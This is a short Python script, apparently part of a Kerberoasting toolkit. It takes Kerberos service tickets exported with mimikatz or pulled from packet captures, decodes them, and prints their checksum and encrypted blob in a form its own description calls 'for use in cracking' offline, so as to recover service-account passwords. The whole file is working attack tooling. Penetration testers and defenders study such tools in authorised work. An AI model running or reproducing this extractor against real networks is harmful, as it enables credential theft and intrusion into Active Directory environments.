#!/usr/bin/python


from pyasn1.codec.ber import encoder, decoder
import glob
import binascii

if __name__ == '__main__':
	import argparse

	parser = argparse.ArgumentParser(description='Extracts service checksum and encrypted ticket from TGS_REP messages for use in cracking')
	parser.add_argument('files', nargs='+', metavar='file.kirbi',
					help='File name to extract fields from. Use asterisk \'*\' for many files.\n Files are exported with mimikatz or from extracttgsrepfrompcap.py(kerberoast)')
	
	args = parser.parse_args()

	enctickets = []

	# Taken from Tim Medin's tgsextract script (https://github.com/nidem/kerberoast)
	i = 0
	for path in args.files:
		for f in glob.glob(path):
			with open(f, 'rb') as fd:
				data = fd.read()

			if data[0] == '\x76':
				# rem dump 
				enctickets.append((str(decoder.decode(data)[0][2][0][3][2]), i, f))
				i += 1
			elif data[:2] == '6d':
				for ticket in data.strip().split('\n'):
					enctickets.append((str(decoder.decode(ticket.decode('hex'))[0][4][3][2]), i, f))
					i += 1
	
	for t in enctickets:
		filename = t[2]
		checksum = binascii.hexlify(t[0][:16])
		encBlob = binascii.hexlify(t[0][16:])
		print checksum + ":" + encBlob + ":" + filename
